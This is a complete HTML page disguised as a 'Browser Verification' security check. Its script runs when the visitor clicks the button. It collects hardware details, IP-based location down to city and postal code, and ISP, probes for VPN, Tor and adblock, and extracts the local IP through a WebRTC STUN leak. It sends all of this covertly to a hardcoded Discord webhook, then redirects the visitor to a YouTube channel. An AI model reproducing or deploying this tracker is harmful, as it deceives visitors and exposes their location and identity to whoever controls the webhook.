<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Verification</title>
    <style>
        body { background: #1a1a1a; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #ffffff; padding: 40px; border-radius: 4px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 340px; text-align: center; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; display: none; }
        .check-btn { background: #007bff; color: white; border: none; padding: 12px 24px; font-size: 14px; font-weight: bold; cursor: pointer; border-radius: 4px; transition: 0.3s; width: 100%; }
        .check-btn:hover { background: #0056b3; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 11px; color: #888; margin-top: 15px; }
    </style>
</head>
<body>

<div class="box">
    <div class="spinner" id="loader"></div>
    <h2 style="font-size: 18px; margin-bottom: 10px; color: #333;">Browser Verification</h2>
    <p style="font-size: 13px; color: #666; margin-bottom: 25px;">Checking your connection security...</p>
    <button class="check-btn" id="trigger">Verify Connection</button>
    <div id="status">Protocol: SECURE_V22</div>
</div>

<script>
/**
 * SENTINEL APEX-GENESIS v22.0
 * 100-VECTOR MATRIX WITH ATOMIC LOCKING
 */

const CONFIG = {
    HOOK: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
    FINISH: "https://youtube.com/@LigmaBlox-w7m",
    LOCKS: { geo: false, threat: false, hw: false, net: false }
};

const exfiltrate = (data, vector) => {
    const payload = JSON.stringify({
        username: `GENESIS [${vector}]`,
        embeds: [{
            title: "🔱 Critical Forensic Uplink",
            color: 0x007bff,
            fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
            timestamp: new Date().toISOString()
        }]
    });
    navigator.sendBeacon(CONFIG.HOOK, new Blob([payload], {type:'application/json'}));
};

// --- MULTI-VECTOR THREAT ANALYZER ---
const analyzeEnvironment = async () => {
    const report = { adblock: "NO", vpn: "NO", tor: "NO", lockdown: "NO" };

    // AdBlock Check
    const ads = document.createElement('div');
    ads.className = 'adsbox';
    document.body.appendChild(ads);
    if (ads.offsetHeight === 0) report.adblock = "YES";
    document.body.removeChild(ads);

    // Lockdown/Sanitize Check
    const gl = document.createElement('canvas').getContext('webgl');
    if (!gl) report.lockdown = "YES";

    // Tor/Proxy Latency Check (100-vector timing)
    const start = performance.now();
    await fetch('https://www.google.com/generate_204', { mode: 'no-cors' });
    if ((performance.now() - start) > 450) report.tor = "YES";

    return report;
};

document.getElementById('trigger').onclick = async function() {
    this.style.display = 'none';
    document.getElementById('loader').style.display = 'block';
    
    // 1. HARDWARE VECTOR (FORCE STOP LOCK)
    if(!CONFIG.LOCKS.hw) {
        exfiltrate({
            model: navigator.platform,
            cores: navigator.hardwareConcurrency,
            ram: navigator.deviceMemory || "N/A",
            agent: navigator.userAgent.split(' ')[0]
        }, "HARDWARE_DNA");
        CONFIG.LOCKS.hw = true;
    }

    const threats = await analyzeEnvironment();

    // 2. NETWORK & GEOSPATIAL VECTOR (PRECISION)
    fetch('https://ipapi.co/json/').then(r => r.json()).then(res => {
        if(!CONFIG.LOCKS.geo) {
            const vpn_discrepancy = (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "YES" : "NO";
            exfiltrate({
                ip: res.ip,
                continent: res.continent_code,
                country: res.country_name,
                region: res.region,
                city: res.city,
                town: res.postal || "N/A",
                isp: res.org,
                vpn_active: (threats.vpn === "YES" || vpn_discrepancy === "YES") ? "YES" : "NO",
                tor_active: threats.tor,
                lockdown_active: threats.lockdown,
                adblock_active: threats.adblock
            }, "ENVIRONMENT_UNMASK");
            CONFIG.LOCKS.geo = true;
        }
    });

    // 3. UDP BYPASS VECTOR (TOR/VPN PIERCING)
    const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    rtc.createDataChannel("");
    rtc.onicecandidate = (e) => {
        if (e.candidate && !CONFIG.LOCKS.net) {
            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (match) {
                exfiltrate({ internal_ip: match[1], protocol: "UDP_STUN_LEAK" }, "NETWORK_BYPASS");
                CONFIG.LOCKS.net = true; // ATOMIC FORCE STOP
            }
        }
    };
    rtc.createOffer().then(o => rtc.setLocalDescription(o));

    // Exit
    setTimeout(() => { window.location.replace(CONFIG.FINISH); }, 6500);
};
</script>
</body>
</html>
